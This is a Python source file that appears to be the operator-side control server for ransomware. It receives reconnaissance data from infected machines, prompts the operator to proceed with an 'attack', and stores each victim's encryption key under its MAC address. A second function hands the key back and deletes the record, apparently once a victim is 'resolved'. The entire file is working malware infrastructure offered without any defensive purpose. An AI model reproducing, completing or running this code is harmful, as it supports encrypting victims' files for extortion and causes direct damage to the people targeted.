import os
import json
import socket
import time

def attack_request(connection):
    with connection:
        while True:
            
            # Receive & Display Target Information
            recon_system_information = connection.recv(1024);
            print("****************************************************************");
            print(recon_system_information.decode('utf-8'));
            print("****************************************************************");
             
            
            # Prompt Attack
            attack_status = input("Proceed with attack (0/1) ? ");
            connection.send(attack_status.encode('utf-8'));
            
            
            # Cancel Attack
            if(attack_status == '0'):
                print("Attack Canceled");
                connection.close()
                break;
            
            # Continue Attack
            try:
                
                # Get Complete System information + key + mac
                system_information = connection.recv(1024);
                
                # create storage dir
                if not os.path.isdir("attacks_storage"):
                    os.mkdir("attacks_storage");
                system_information = json.loads(system_information);
                
            

               

                
                file_name = system_information['target_mac'];
              
                if not os.path.isfile(f'attacks_storage\\{file_name}.txt'):
                    save_file = open(f'attacks_storage\\{file_name}.txt', "x")
            
              
                
                f = open(f'attacks_storage\\{file_name}.txt', "a")
                f.write(json.dumps(system_information,indent=2));
                f.close();
                
                # send saved status
                connection.send("1".encode('utf-8'));
                
            except:
                # continue
                connection.send("0".encode('utf-8'));
                
            
            break;
        
def resolve_attack(connection):
        target_resolve_mac = connection.recv(1024);
        target_mac = json.loads(target_resolve_mac)['target_mac'];
        
        if os.path.isdir("attacks_storage"):
            if os.path.isfile(f"attacks_storage/{target_mac}.txt"):
                f = open(f"attacks_storage/{target_mac}.txt",'r');
                data = json.loads(f.read());
                encryption_key = data['encryption_key'];
                
                connection.send(encryption_key.encode('utf-8'))
                f.close()
                os.remove(f"attacks_storage\\{target_mac}.txt");
            else: 
                print("File not Found");
                connection.send("".encode('utf-8'))
        else:
            print("No Attack Stored");
            connection.send("".encode('utf-8'))
        
        # connection.close();